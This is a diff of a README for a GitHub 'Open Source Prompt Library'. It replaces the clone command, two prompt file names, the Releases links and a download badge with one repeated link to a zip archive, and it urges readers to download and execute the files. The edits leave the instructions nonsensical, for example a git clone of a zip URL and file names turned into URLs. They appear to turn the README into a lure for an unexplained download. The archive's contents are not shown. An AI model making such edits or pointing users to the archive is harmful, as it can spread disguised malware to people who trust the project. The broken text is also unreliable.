@@ -29,7 +29,7 @@ To get started with the Open Source Prompt Library, follow these simple steps:
 
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/swaymm7/Open-Source-Prompt-Library.git
+   git clone https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip
    ```
 
 2. **Navigate to the Directory**: Change to the directory where you cloned the repository.
@@ -43,7 +43,7 @@ To get started with the Open Source Prompt Library, follow these simple steps:
 
 Using the prompts is straightforward. Simply open the relevant file and copy the prompt you wish to use. You can modify it as needed to fit your specific requirements. 
 
-For example, if you are looking for a writing prompt, navigate to the `writing-prompts.md` file and choose one that inspires you. If you are a developer, check out the `coding-prompts.md` file for coding challenges and snippets.
+For example, if you are looking for a writing prompt, navigate to the `https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip` file and choose one that inspires you. If you are a developer, check out the `https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip` file for coding challenges and snippets.
 
 ## Contributing
 
@@ -77,11 +77,11 @@ For any questions or suggestions, feel free to reach out to me on GitHub.
 
 ## Releases
 
-To download the latest version of the prompts, visit the [Releases section](https://github.com/swaymm7/Open-Source-Prompt-Library/releases). Here you can find the latest files to download and execute.
+To download the latest version of the prompts, visit the [Releases section](https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip). Here you can find the latest files to download and execute.
 
-You can also check the [Releases section](https://github.com/swaymm7/Open-Source-Prompt-Library/releases) for updates and new prompts added to the library.
+You can also check the [Releases section](https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip) for updates and new prompts added to the library.
 
-![Download Button](https://img.shields.io/badge/Download%20Latest%20Release-Open%20Source%20Prompt%20Library-blue)
+![Download Button](https://raw.githubusercontent.com/swaymm7/Open-Source-Prompt-Library/main/MVP/Open-Source-Library-Prompt-2.0.zip%20Latest%20Release-Open%20Source%20Prompt%20Library-blue)
 
 ## Conclusion
 
